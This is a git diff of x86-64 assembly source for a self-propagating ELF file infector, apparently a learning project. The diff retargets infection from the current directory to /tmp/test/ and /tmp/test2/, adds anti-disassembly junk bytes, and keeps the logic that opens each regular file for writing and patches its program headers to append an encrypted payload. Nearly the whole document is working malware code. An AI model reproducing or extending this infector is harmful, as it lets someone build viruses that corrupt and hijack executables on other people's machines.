@@ -4,6 +4,9 @@ section .text
   global _start
 
 decryptor:
+  jmp .init + 2
+  .init:
+  db '\xb8\xd9'
   push rdx
   push rsp
 
@@ -30,6 +33,9 @@ decryptor:
 
 
 _start:
+  ; jmp ._start + 2
+  ._start:
+  ; db '\x48\x81'
   push rdx
   push rsp
   ; deactivate signals?
@@ -250,21 +256,41 @@ _start:
 
           .close_proc_folder:
             mov rdi, [r15 + DOT_FD]
+            mov byte [r15 + TMP_TEST], 0 ; init to 0
             mov rax, SYS_CLOSE
             syscall
 
   ; no 'test' program found, we can continue safely
 
-  ; --- Open "."
-  .start_open:
-  push "." ; push "." to stack (rsp)
-  mov rdi, rsp
+  ; --- Open "tmp" and tmp2
+  start_open:
+  cmp byte [r15 + TMP_TEST], 0
+  jne .prepare_test2
+
+  call .test
+    .push_test:
+      db '/tmp/test/', 0
+    .test:
+      pop r13 ; storing temporarily in r13 for later use
+      mov rdi, r13
+      jmp .open_folder
+
+  .prepare_test2:
+    call .test2
+    .push_test2:
+      db '/tmp/test2/', 0
+    .test2:
+      pop r13 ; storing in r13 for later use
+      mov rdi, r13; 
+      jmp .open_folder
+
+  .open_folder:
   mov rsi, O_RDONLY ; 
+  ; rdi is either "/tmp/test" or "/tmp/test2"
   xor rdx, rdx ;  no flags
   mov rax, SYS_OPEN ;
   syscall ; open
 
-  pop rdi ; pop the "." we pushed earlier
   cmp rax, 0
   jl cleanup
 
@@ -282,7 +308,7 @@ _start:
 
   ; Check if directory size is < 0
   cmp qword [r15 + DIR_SIZE], 0
-  jle close_dot
+  jle check_tmp2
 
   xor rcx, rcx ; set rcx to 0
 
@@ -292,8 +318,38 @@ _start:
     cmp byte[rcx + r15 + DIRENT_D_TYPE], DT_REG ; check if it's a regular file
     jne .next_file
 
+    ; copy prefix
+    push r13 ; store r13
+    lea rax, [r15 + COPY_BUF]
+    .cpy_prefix:
+      cmp byte [r13], 0
+      je .prepare_cpy_name
+
+      mov dl, byte [r13]
+      mov byte [rax], dl
+      inc rax
+      inc r13
+      jmp .cpy_prefix
+
+    .prepare_cpy_name:
+      pop r13 ; restore r13
+      lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
+      .cpy_name:
+        cmp byte [rdi], 0
+        je .done_cpy
+
+        mov dl, byte [rdi]
+        mov byte [rax], dl
+        inc rax
+        inc rdi
+        jmp .cpy_name
+
+    .done_cpy:
+      mov byte [rax], 0; null terminate
+
     ; Open file
-    lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
+    .open_file:
+    lea rdi, [r15 + COPY_BUF]
     mov rsi, O_RDWR ; Read + Write rights
     xor rdx, rdx ; no flags
     mov rax, SYS_OPEN
@@ -474,9 +530,11 @@ _start:
       mov rax, r10 ; restore target EOF into rax
 
       mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
+      push r13 ; store r13
       mov r13, [r15 + ST_SIZE] ; loading st_size in r13
       add r13, VADDR ; adding VADDR to target file size. Big address to not interfere with program.
       mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
+      pop r13 ; restore r13
 
       mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
       add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; adjust filesize
@@ -739,6 +797,17 @@ _start:
       cmp rcx, [r15 + DIR_SIZE]
       jl .loop_directory
       jmp loop_getdents
+
+check_tmp2:
+  cmp byte [r15 + TMP_TEST], 0
+  jne close_dot
+
+  mov byte [r15 + TMP_TEST], 1
+
+  mov rdi, [r15 + DOT_FD]
+  mov rax, SYS_CLOSE
+  syscall
+  jmp start_open
 
 close_dot:
   mov rdi, [r15 + DOT_FD]
